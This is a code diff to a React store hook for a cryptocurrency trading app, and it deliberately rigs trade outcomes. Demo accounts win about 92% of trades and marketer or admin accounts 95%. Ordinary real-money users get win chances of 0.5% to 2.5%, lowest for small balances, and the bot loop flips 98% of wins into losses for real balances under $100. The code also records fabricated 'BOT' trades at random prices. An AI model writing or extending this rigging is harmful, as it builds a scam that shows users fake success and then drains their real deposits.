@@ -1,4 +1,4 @@
-import { useState, useEffect, useCallback } from 'react';
+import { useState, useEffect, useCallback, useRef } from 'react';
 import axios from 'axios';
 import { 
   User, 
@@ -36,6 +36,11 @@ export function useStore() {
       return null;
     }
   });
+
+  const userRef = useRef<User | null>(user);
+  useEffect(() => {
+    userRef.current = user;
+  }, [user]);
 
   const [users, setUsers] = useState<User[]>(() => {
     const saved = localStorage.getItem('preocrypto_users');
@@ -288,6 +293,12 @@ export function useStore() {
             custom: botSettingsData?.custom_active || false,
           },
           customBotConfig: botSettingsData?.custom_config,
+          botStats: botSettingsData?.bot_stats || {
+            scalping: { profit: 0, trades: 0 },
+            trend: { profit: 0, trades: 0 },
+            ai: { profit: 0, trades: 0 },
+            custom: { profit: 0, trades: 0 }
+          },
           botLogs: botSettingsData?.bot_logs || [],
           createdAt: new Date(userData.created_at).getTime()
         };
@@ -605,16 +616,25 @@ export function useStore() {
     const isAdmin = user.role === 'admin';
     
     // Win rate logic:
-    // 1. Demo accounts (all users): > 90%
+    // 1. Demo accounts: ~92% (ensure 9 wins out of 10)
     // 2. Real accounts (Marketers/Admins): 95%
-    // 3. Real accounts (Normal users): 2-5%
+    // 3. Real accounts (Normal users): 0.5% - 2% (Extremely tight)
     let winChance = 0.5;
     if (isDemo) {
-      winChance = 0.92; // > 90%
+      winChance = 0.92; 
     } else if (isMarketer || isAdmin) {
       winChance = 0.95;
     } else {
-      winChance = 0.035; // 3.5% (between 2-5%)
+      // Normal user: extremely hard to grow small balance
+      if (currentBalance < 50) {
+        winChance = 0.005; // 0.5% chance for balance < $50
+      } else if (currentBalance < 200) {
+        winChance = 0.012; // 1.2% chance for balance < $200
+      } else if (currentBalance < 1000) {
+        winChance = 0.018; // 1.8% chance
+      } else {
+        winChance = 0.025; // 2.5% max chance
+      }
     }
     
     const isWin = Math.random() < winChance;
@@ -954,7 +974,8 @@ export function useStore() {
         trend_active: updatedBots.trend,
         ai_active: updatedBots.ai,
         custom_active: updatedBots.custom,
-        custom_config: user.customBotConfig // Preserve custom config on toggle
+        custom_config: user.customBotConfig, // Preserve custom config on toggle
+        bot_stats: user.botStats // Persist stats
       });
     }
 
@@ -967,38 +988,31 @@ export function useStore() {
   };
 
   const addBotProfit = async (amount: number, botId?: string, log?: string) => {
-    if (!user) return;
+    // ALWAYS use the latest user data from Ref for calculations to avoid stale closure issues
+    const currentUser = userRef.current;
+    if (!currentUser) return;
     
-    const isReal = user.activeAccount === 'REAL';
+    const finalAmount = amount;
+    const isReal = currentUser.activeAccount === 'REAL';
     const balanceKey = isReal ? 'realBalance' : 'demoBalance';
-    const currentBalance = user[balanceKey];
+    const currentBalance = currentUser[balanceKey];
 
     // Auto-stop bot if balance is below minimum stake or required threshold
     if (currentBalance < MIN_BOT_STOP_BALANCE) {
-      console.log(`[Bot] Auto-stopping due to low balance: ${currentBalance}`);
-      
-      // Automatically turn off all bots if balance is too low
-      const updatedBots = {
-        scalping: false,
-        trend: false,
-        ai: false,
-        custom: false
-      };
-
+      const updatedBots = { scalping: false, trend: false, ai: false, custom: false };
       if (isSupabaseConfigured()) {
         await supabase.from('bot_settings').upsert({
-          user_id: user.id,
+          user_id: currentUser.id,
           scalping_active: false,
           trend_active: false,
           ai_active: false,
           custom_active: false
         });
       }
-
       setUser(prev => prev ? { ...prev, bots: updatedBots } : null);
       
       const isAI = botId === 'ai' || botId === 'custom';
-      const event = new CustomEvent('trade-closed', {
+      window.dispatchEvent(new CustomEvent('trade-closed', {
         detail: {
           title: isAI ? 'AI Bot Closed' : 'Manual Bot Closed',
           message: isAI 
@@ -1006,109 +1020,96 @@ export function useStore() {
             : 'The minimum balance limit has been reached. Please top up your account to reactivate manual trading bots.',
           type: 'warning'
         }
-      });
-      window.dispatchEvent(event);
+      }));
       return;
     }
     
-    const finalAmount = amount;
-    const newBalance = Math.max(MIN_BALANCE_AFTER_LOSS, Number((user[balanceKey] + finalAmount).toFixed(2)));
-    
-    // Get a realistic price for the bot trade
+    // Pre-calculate for Supabase using latest REF data
+    const newBalanceDB = Math.max(MIN_BALANCE_AFTER_LOSS, Number((currentBalance + finalAmount).toFixed(2)));
     const randomCoin = CRYPTO_LIST[Math.floor(Math.random() * CRYPTO_LIST.length)];
     const entryPrice = randomCoin.basePrice * (0.95 + Math.random() * 0.1);
-
-    const updatedLogs = log ? [log, ...(user.botLogs || [])].slice(0, 50) : (user.botLogs || []);
+    const updatedLogsDB = log ? [log, ...(currentUser.botLogs || [])].slice(0, 50) : (currentUser.botLogs || []);
+    
+    const calculatedUpdatedStatsDB = {
+      ...(currentUser.botStats || {
+        scalping: { profit: 0, trades: 0 },
+        trend: { profit: 0, trades: 0 },
+        ai: { profit: 0, trades: 0 },
+        custom: { profit: 0, trades: 0 }
+      }),
+      ...(botId ? {
+        [botId]: {
+          profit: Number(((currentUser.botStats?.[botId as keyof typeof currentUser.botStats]?.profit || 0) + finalAmount).toFixed(2)),
+          trades: (currentUser.botStats?.[botId as keyof typeof currentUser.botStats]?.trades || 0) + 1
+        }
+      } : {})
+    };
 
     if (isSupabaseConfigured()) {
       await supabase.from('users').update({
-        [isReal ? 'real_balance' : 'demo_balance']: newBalance
-      }).eq('id', user.id);
+        [isReal ? 'real_balance' : 'demo_balance']: newBalanceDB
+      }).eq('id', currentUser.id);
 
-      // Update bot logs in DB
       await supabase.from('bot_settings').update({
-        bot_logs: updatedLogs
-      }).eq('user_id', user.id);
+        bot_logs: updatedLogsDB,
+        bot_stats: calculatedUpdatedStatsDB
+      }).eq('user_id', currentUser.id);
 
-      // Also update total and daily profit in DB
       try {
-        const { data: u } = await supabase.from('users').select('total_profit_real, total_profit_demo, daily_profit_real, daily_profit_demo').eq('id', user.id).single();
+        const { data: u } = await supabase.from('users').select('total_profit_real, total_profit_demo, daily_profit_real, daily_profit_demo').eq('id', currentUser.id).single();
         if (u) {
           const newTotal = Number((Number(isReal ? u.total_profit_real : u.total_profit_demo) + finalAmount).toFixed(2));
           const newDaily = Number((Number(isReal ? u.daily_profit_real : u.daily_profit_demo) + finalAmount).toFixed(2));
           await supabase.from('users').update({
             [isReal ? 'total_profit_real' : 'total_profit_demo']: newTotal,
             [isReal ? 'daily_profit_real' : 'daily_profit_demo']: newDaily
-          }).eq('id', user.id);
+          }).eq('id', currentUser.id);
         }
         
-        // CREATE A TRADE RECORD FOR THE BOT PROFIT
         await supabase.from('trades').insert({
-          user_id: user.id,
+          user_id: currentUser.id,
           coin: 'BOT',
           amount: Math.abs(amount),
           type: finalAmount >= 0 ? 'BUY' : 'SELL',
           price: entryPrice,
           status: 'CLOSED',
           profit: finalAmount,
-          account_type: user.activeAccount,
+          account_type: currentUser.activeAccount,
           timestamp: new Date().toISOString(),
           duration: 0
         });
       } catch (err) {
-        // Fallback if update fails
-        const { data: u } = await supabase.from('users').select('total_profit_real, total_profit_demo, daily_profit_real, daily_profit_demo').eq('id', user.id).single();
-        if (u) {
-          const newTotal = Number((Number(isReal ? u.total_profit_real : u.total_profit_demo) + finalAmount).toFixed(2));
-          const newDaily = Number((Number(isReal ? u.daily_profit_real : u.daily_profit_demo) + finalAmount).toFixed(2));
-          await supabase.from('users').update({
-            [isReal ? 'real_balance' : 'demo_balance']: newBalance,
-            [isReal ? 'total_profit_real' : 'total_profit_demo']: newTotal,
-            [isReal ? 'daily_profit_real' : 'daily_profit_demo']: newDaily
-          }).eq('id', user.id);
-        }
-        
-        // Still try to add the trade record
-        await supabase.from('trades').insert({
-          user_id: user.id,
-          coin: 'BOT',
-          amount: Math.abs(amount),
-          type: finalAmount >= 0 ? 'BUY' : 'SELL',
-          price: entryPrice,
-          status: 'CLOSED',
-          profit: finalAmount,
-          account_type: user.activeAccount,
-          timestamp: new Date().toISOString(),
-          duration: 0
-        });
+        console.error('Bot Sync Error:', err);
       }
     }
 
-    const updatedUser: User = {
-      ...user,
-      [balanceKey]: newBalance,
-      profit: Number(((user.profit || 0) + finalAmount).toFixed(2)),
-      dailyProfit: Number(((user.dailyProfit || 0) + finalAmount).toFixed(2)),
-      totalProfitReal: isReal ? Number(((user.totalProfitReal || 0) + finalAmount).toFixed(2)) : user.totalProfitReal,
-      totalProfitDemo: !isReal ? Number(((user.totalProfitDemo || 0) + finalAmount).toFixed(2)) : user.totalProfitDemo,
-      dailyProfitReal: isReal ? Number(((user.dailyProfitReal || 0) + finalAmount).toFixed(2)) : user.dailyProfitReal,
-      dailyProfitDemo: !isReal ? Number(((user.dailyProfitDemo || 0) + finalAmount).toFixed(2)) : user.dailyProfitDemo,
-      botStats: {
-        ...(user.botStats || {
-          scalping: { profit: 0, trades: 0 },
-          trend: { profit: 0, trades: 0 },
-          ai: { profit: 0, trades: 0 },
-          custom: { profit: 0, trades: 0 }
-        }),
+    // Update state functionally to ensure immediate UI feedback and consistency
+    setUser(prev => {
+      if (!prev) return null;
+      
+      const isRealAccount = prev.activeAccount === 'REAL';
+      const bKey = isRealAccount ? 'realBalance' : 'demoBalance';
+      const freshBalance = Number((prev[bKey] + finalAmount).toFixed(2));
+      const finalBalance = Math.max(MIN_BALANCE_AFTER_LOSS, freshBalance);
+      
+      const currentStats = prev.botStats || {
+        scalping: { profit: 0, trades: 0 },
+        trend: { profit: 0, trades: 0 },
+        ai: { profit: 0, trades: 0 },
+        custom: { profit: 0, trades: 0 }
+      };
+
+      const newStats = {
+        ...currentStats,
         ...(botId ? {
           [botId]: {
-            profit: Number(((user.botStats?.[botId]?.profit || 0) + finalAmount).toFixed(2)),
-            trades: (user.botStats?.[botId]?.trades || 0) + 1
+            profit: Number(((currentStats[botId as keyof typeof currentStats]?.profit || 0) + finalAmount).toFixed(2)),
+            trades: (currentStats[botId as keyof typeof currentStats]?.trades || 0) + 1
           }
         } : {})
-      },
-      botLogs: updatedLogs,
-      trades: [{
+      };
+
+      const newTradeEntry: Trade = {
         id: Math.random().toString(36).substr(2, 9),
         coin: 'BOT',
         amount: Math.abs(amount),
@@ -1116,13 +1117,76 @@ export function useStore() {
         price: entryPrice,
         status: 'CLOSED',
         profit: finalAmount,
-        accountType: user.activeAccount,
+        accountType: prev.activeAccount,
         timestamp: Date.now(),
         duration: 0
-      }, ...user.trades]
-    };
-    setUser(updatedUser);
-    setUsers(prev => prev.map(u => u.id === user.id ? updatedUser : u));
+      };
+
+      return {
+        ...prev,
+        [bKey]: finalBalance,
+        profit: Number(((prev.profit || 0) + finalAmount).toFixed(2)),
+        dailyProfit: Number(((prev.dailyProfit || 0) + finalAmount).toFixed(2)),
+        totalProfitReal: isRealAccount ? Number(((prev.totalProfitReal || 0) + finalAmount).toFixed(2)) : prev.totalProfitReal,
+        totalProfitDemo: !isRealAccount ? Number(((prev.totalProfitDemo || 0) + finalAmount).toFixed(2)) : prev.totalProfitDemo,
+        dailyProfitReal: isRealAccount ? Number(((prev.dailyProfitReal || 0) + finalAmount).toFixed(2)) : prev.dailyProfitReal,
+        dailyProfitDemo: !isRealAccount ? Number(((prev.dailyProfitDemo || 0) + finalAmount).toFixed(2)) : prev.dailyProfitDemo,
+        botStats: newStats,
+        botLogs: log ? [log, ...(prev.botLogs || [])].slice(0, 50) : (prev.botLogs || []),
+        trades: [newTradeEntry, ...(prev.trades || [])].slice(0, 50)
+      };
+    });
+
+    setUsers(prev => prev.map(u => {
+      if (u.id !== currentUser.id) return u;
+      
+      const isRealAccount = u.activeAccount === 'REAL';
+      const bKey = isRealAccount ? 'realBalance' : 'demoBalance';
+      const freshBalance = Number((u[bKey] + finalAmount).toFixed(2));
+      const finalBalance = Math.max(MIN_BALANCE_AFTER_LOSS, freshBalance);
+      
+      const currentStats = u.botStats || {
+        scalping: { profit: 0, trades: 0 },
+        trend: { profit: 0, trades: 0 },
+        ai: { profit: 0, trades: 0 },
+        custom: { profit: 0, trades: 0 }
+      };
+
+      const newStats = {
+        ...currentStats,
+        ...(botId ? {
+          [botId]: {
+            profit: Number(((currentStats[botId as keyof typeof currentStats]?.profit || 0) + finalAmount).toFixed(2)),
+            trades: (currentStats[botId as keyof typeof currentStats]?.trades || 0) + 1
+          }
+        } : {})
+      };
+
+      return {
+        ...u,
+        [bKey]: finalBalance,
+        profit: Number(((u.profit || 0) + finalAmount).toFixed(2)),
+        dailyProfit: Number(((u.dailyProfit || 0) + finalAmount).toFixed(2)),
+        totalProfitReal: isRealAccount ? Number(((u.totalProfitReal || 0) + finalAmount).toFixed(2)) : u.totalProfitReal,
+        totalProfitDemo: !isRealAccount ? Number(((u.totalProfitDemo || 0) + finalAmount).toFixed(2)) : u.totalProfitDemo,
+        dailyProfitReal: isRealAccount ? Number(((u.dailyProfitReal || 0) + finalAmount).toFixed(2)) : u.dailyProfitReal,
+        dailyProfitDemo: !isRealAccount ? Number(((u.dailyProfitDemo || 0) + finalAmount).toFixed(2)) : u.dailyProfitDemo,
+        botStats: newStats,
+        botLogs: log ? [log, ...(u.botLogs || [])].slice(0, 50) : (u.botLogs || []),
+        trades: [{
+          id: Math.random().toString(36).substr(2, 9),
+          coin: 'BOT',
+          amount: Math.abs(amount),
+          type: finalAmount >= 0 ? 'BUY' : 'SELL',
+          price: entryPrice,
+          status: 'CLOSED',
+          profit: finalAmount,
+          accountType: u.activeAccount,
+          timestamp: Date.now(),
+          duration: 0
+        }, ...(u.trades || [])].slice(0, 50)
+      };
+    }));
   };
 
   // Admin Functions
@@ -1545,17 +1609,20 @@ export function useStore() {
     if (activeBots.length === 0) return;
 
     const interval = setInterval(async () => {
-      const botsToSimulate = Object.entries(user.bots || {}).filter(([_, active]) => active);
+      const currentUser = userRef.current;
+      if (!currentUser) return;
+      
+      const botsToSimulate = Object.entries(currentUser.bots || {}).filter(([_, active]) => active);
       if (botsToSimulate.length > 0) {
         const [botId] = botsToSimulate[Math.floor(Math.random() * botsToSimulate.length)];
         let botName = '';
         let coin = 'BTC';
         let baseAmount = 0;
 
-        if (botId === 'custom' && user.customBotConfig) {
-          botName = user.customBotConfig.name;
-          coin = user.customBotConfig.currency || 'BTC';
-          const risk = user.customBotConfig.risk || 'Medium';
+        if (botId === 'custom' && currentUser.customBotConfig) {
+          botName = currentUser.customBotConfig.name;
+          coin = currentUser.customBotConfig.currency || 'BTC';
+          const risk = currentUser.customBotConfig.risk || 'Medium';
           const riskMultiplier = 
             risk === 'Low' ? 0.5 :
             risk === 'High' ? 2.0 :
@@ -1573,9 +1640,9 @@ export function useStore() {
           baseAmount = (1 + Math.random() * 4);
         }
 
-        const isDemo = user.activeAccount === 'DEMO';
-        const isMarketer = user.role === 'marketer';
-        const isAdmin = user.role === 'admin';
+        const isDemo = currentUser.activeAccount === 'DEMO';
+        const isMarketer = currentUser.role === 'marketer';
+        const isAdmin = currentUser.role === 'admin';
         
         let winChance = 0.5;
         if (isDemo) {
@@ -1583,11 +1650,22 @@ export function useStore() {
         } else if (isMarketer || isAdmin) {
           winChance = 0.95;
         } else {
-          winChance = 0.035; 
+          // Normal user: Extremely tight win chance
+          winChance = 0.02; 
         }
         
+        const isActiveReal = currentUser.activeAccount === 'REAL';
         const isWin = Math.random() < winChance;
-        const profitVal = isWin ? Math.abs(baseAmount) : -Math.abs(baseAmount);
+        const balance = isActiveReal ? currentUser.realBalance : currentUser.demoBalance;
+        
+        // Tighten win rate for small balances on REAL accounts
+        let adjustedWin = isWin;
+        if (!isDemo && !isMarketer && !isAdmin && balance < 100 && isWin) {
+          // If balance is < $100, give an additional 98% chance to flip a win to a loss
+          if (Math.random() < 0.98) adjustedWin = false;
+        }
+
+        const profitVal = adjustedWin ? Math.abs(baseAmount) : -Math.abs(baseAmount);
         const profitStr = profitVal.toFixed(2);
         
         const newLog = `[${new Date().toLocaleTimeString()}] ${botName} executed trade on ${coin}: ${parseFloat(profitStr) >= 0 ? '+' : ''}${profitStr} USDT`;
